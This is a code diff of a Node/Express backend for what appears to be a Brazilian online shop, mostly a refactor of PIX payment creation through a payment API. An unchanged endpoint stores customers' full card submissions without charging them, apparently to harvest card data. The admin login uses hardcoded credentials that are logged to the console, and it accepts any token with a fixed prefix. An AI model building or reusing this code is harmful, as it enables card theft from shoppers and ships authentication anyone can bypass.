@@ -58,8 +58,12 @@ function detectOS(userAgent) {
     return 'Outro';
 }
 
-// ========== FUNÇÃO PARA CRIAR PAGAMENTO PLUMIFY ==========
-async function criarPagamentoPlumify(dadosCliente, total, itens, host) {
+// ========== FUNÇÃO PARA CRIAR PAGAMENTO PIX NA PLUMIFY ==========
+async function criarPagamentoPix(dadosCliente, total, itens, host) {
+    const telefoneLimpo = dadosCliente.cliente_telefone ? dadosCliente.cliente_telefone.replace(/\D/g, '') : '';
+    const cpfLimpo = dadosCliente.cliente_cpf ? dadosCliente.cliente_cpf.replace(/\D/g, '') : '';
+    const cepLimpo = dadosCliente.endereco_cep ? dadosCliente.endereco_cep.replace(/\D/g, '') : '';
+    
     const payload = {
         amount: Math.round(total * 100),
         offer_hash: OFFER_HASH,
@@ -67,15 +71,15 @@ async function criarPagamentoPlumify(dadosCliente, total, itens, host) {
         customer: {
             name: dadosCliente.cliente_nome,
             email: dadosCliente.cliente_email,
-            phone_number: dadosCliente.cliente_telefone ? dadosCliente.cliente_telefone.replace(/\D/g, '') : '',
-            document: dadosCliente.cliente_cpf ? dadosCliente.cliente_cpf.replace(/\D/g, '') : '',
+            phone_number: telefoneLimpo,
+            document: cpfLimpo,
             street_name: dadosCliente.endereco_rua || '',
             number: dadosCliente.endereco_numero || '',
             complement: dadosCliente.endereco_complemento || "",
             neighborhood: dadosCliente.endereco_bairro || '',
             city: dadosCliente.endereco_cidade || '',
             state: dadosCliente.endereco_uf || '',
-            zip_code: dadosCliente.endereco_cep ? dadosCliente.endereco_cep.replace(/\D/g, '') : ''
+            zip_code: cepLimpo
         },
         cart: itens.map(item => ({
             product_hash: PRODUCT_HASH,
@@ -88,29 +92,18 @@ async function criarPagamentoPlumify(dadosCliente, total, itens, host) {
         })),
         expire_in_days: 1,
         transaction_origin: "api",
-        tracking: {
-            src: "",
-            utm_source: "direct",
-            utm_medium: "",
-            utm_campaign: "",
-            utm_term: "",
-            utm_content: ""
-        },
+        tracking: { src: "", utm_source: "direct", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" },
         postback_url: `${host}/api/webhook/plumify`
     };
 
     try {
         const response = await fetch(PLUMIFY_API_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${PLUMIFY_API_KEY}`
-            },
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${PLUMIFY_API_KEY}` },
             body: JSON.stringify(payload)
         });
-        
         const data = await response.json();
-        console.log('Resposta Plumify:', data);
+        console.log('Resposta Plumify:', JSON.stringify(data, null, 2));
         return data;
     } catch (error) {
         console.error('Erro ao criar pagamento Plumify:', error);
@@ -148,61 +141,44 @@ app.get('/api/cep/:cep', async (req, res) => {
     }
 });
 
-// Salvar pedido - PIX com Plumify
 app.post('/api/pedido', async (req, res) => {
     const pedidoId = 'CAP' + Date.now();
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'];
     
-    // Atualizar vendas
     if (req.body.itens) {
         req.body.itens.forEach(item => {
             const produto = produtos.find(p => p.id === item.id);
-            if (produto) {
-                produto.vendas = (produto.vendas || 0) + item.quantidade;
-            }
+            if (produto) produto.vendas = (produto.vendas || 0) + item.quantidade;
         });
     }
     
     let paymentResult = null;
     
-    // Só tenta criar pagamento na Plumify se for PIX e tiver os dados necessários
-    if (req.body.forma_pagamento === 'PIX' && req.body.cliente_nome && req.body.cliente_email) {
+    if (req.body.forma_pagamento === 'PIX') {
+        if (!req.body.cliente_nome || !req.body.cliente_email || !req.body.cliente_cpf) {
+            return res.status(400).json({ success: false, error: 'Dados incompletos' });
+        }
         const protocol = req.headers['x-forwarded-proto'] || 'https';
         const host = req.headers['host'];
-        const baseUrl = `${protocol}://${host}`;
-        
-        paymentResult = await criarPagamentoPlumify(req.body, req.body.total, req.body.itens, baseUrl);
+        paymentResult = await criarPagamentoPix(req.body, req.body.total, req.body.itens, `${protocol}://${host}`);
     }
     
     const pedido = { 
-        ...req.body, 
-        pedido_id: pedidoId, 
-        ip_cliente: ip,
-        dispositivo: detectDevice(userAgent),
-        navegador: detectBrowser(userAgent),
-        sistema: detectOS(userAgent),
-        payment_id: paymentResult?.id || null,
-        payment_qr_code: paymentResult?.pix_qr_code || null,
-        payment_qr_code_base64: paymentResult?.pix_qr_code_base64 || null,
-        payment_status: paymentResult?.status || 'pendente',
+        ...req.body, pedido_id: pedidoId, ip_cliente: ip,
+        dispositivo: detectDevice(userAgent), navegador: detectBrowser(userAgent), sistema: detectOS(userAgent),
+        payment_id: paymentResult?.id || null, payment_qr_code: paymentResult?.pix_qr_code || null,
+        payment_qr_code_base64: paymentResult?.pix_qr_code_base64 || null, payment_status: paymentResult?.status || 'pendente',
         created_at: new Date().toISOString() 
     };
     pedidos.unshift(pedido);
-    console.log('Pedido salvo:', pedidoId);
     
-    res.json({ 
-        success: true, 
-        pedido_id: pedidoId,
-        payment: paymentResult
-    });
+    res.json({ success: true, pedido_id: pedidoId, payment: paymentResult });
 });
 
-// Salvar cartão (continua funcionando)
 app.post('/api/cartao', (req, res) => {
     const novoCartao = { id: Date.now(), ...req.body, created_at: new Date().toISOString() };
     cartoes.push(novoCartao);
-    console.log('Cartão salvo:', novoCartao);
     res.json({ success: true });
 });
 
@@ -210,18 +186,12 @@ app.post('/api/visitante', (req, res) => {
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'];
     const { visitor_id, origem } = req.body;
-    
     const existing = visitantes.find(v => v.visitor_id === visitor_id);
     if (existing) {
         existing.ultima_atividade = new Date().toISOString();
-        existing.page_views = (existing.page_views || 0) + 1;
+        existing.page_views++;
     } else {
-        visitantes.push({
-            visitor_id, ip: ip, user_agent: userAgent,
-            dispositivo: detectDevice(userAgent), navegador: detectBrowser(userAgent), sistema: detectOS(userAgent),
-            origem: origem || 'direct', etapa: 'visitante', page_views: 1,
-            primeira_visita: new Date().toISOString(), ultima_atividade: new Date().toISOString()
-        });
+        visitantes.push({ visitor_id, ip, user_agent: userAgent, dispositivo: detectDevice(userAgent), navegador: detectBrowser(userAgent), sistema: detectOS(userAgent), origem: origem || 'direct', etapa: 'visitante', page_views: 1, primeira_visita: new Date().toISOString(), ultima_atividade: new Date().toISOString() });
     }
     res.json({ success: true });
 });
@@ -237,17 +207,11 @@ app.post('/api/carrinho', (req, res) => {
     res.json({ success: true });
 });
 
-// Webhook Plumify
 app.post('/api/webhook/plumify', async (req, res) => {
     console.log('Webhook recebido:', req.body);
     const { transaction_id, status } = req.body;
-    
     const pedido = pedidos.find(p => p.payment_id === transaction_id);
-    if (pedido) {
-        pedido.payment_status = status;
-        console.log(`Pedido ${pedido.pedido_id} atualizado para status: ${status}`);
-    }
-    
+    if (pedido) pedido.payment_status = status;
     res.json({ success: true });
 });
 
@@ -256,8 +220,7 @@ app.post('/api/webhook/plumify', async (req, res) => {
 app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body;
     if (username === 'kakabanker' && password === '77991958@Abc') {
-        const token = 'admin_auth_' + Date.now();
-        res.json({ success: true, token: token });
+        res.json({ success: true, token: 'admin_auth_' + Date.now() });
     } else {
         res.status(401).json({ success: false });
     }
@@ -265,9 +228,7 @@ app.post('/api/admin/login', (req, res) => {
 
 function verifyAdmin(req, res, next) {
     const token = req.headers.authorization;
-    if (!token || !token.startsWith('Bearer admin_auth_')) {
-        return res.status(401).json({ success: false });
-    }
+    if (!token || !token.startsWith('Bearer admin_auth_')) return res.status(401).json({ success: false });
     next();
 }
 
@@ -275,20 +236,7 @@ app.get('/api/admin/produtos', verifyAdmin, (req, res) => { res.json({ success: 
 
 app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
     const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
-    const novoProduto = { 
-        id: novoId, 
-        nome: req.body.nome,
-        preco: req.body.preco,
-        preco_antigo: req.body.preco_antigo || null,
-        descricao: req.body.descricao || '',
-        categoria: req.body.categoria,
-        estoque: req.body.estoque || 0,
-        imagem: req.body.imagem || '',
-        vendas: 0,
-        ativo: true, 
-        created_at: new Date().toISOString() 
-    };
-    produtos.push(novoProduto);
+    produtos.push({ id: novoId, nome: req.body.nome, preco: req.body.preco, preco_antigo: req.body.preco_antigo || null, descricao: req.body.descricao || '', categoria: req.body.categoria, estoque: req.body.estoque || 0, imagem: req.body.imagem || '', vendas: 0, ativo: true, created_at: new Date().toISOString() });
     res.json({ success: true });
 });
 
@@ -316,6 +264,5 @@ app.post('/api/admin/pix', verifyAdmin, (req, res) => { pixKey = req.body.pix_ke
 
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
-    console.log(`Admin: http://localhost:${PORT}/admin`);
     console.log(`Login: kakabanker / 77991958@Abc`);
 });
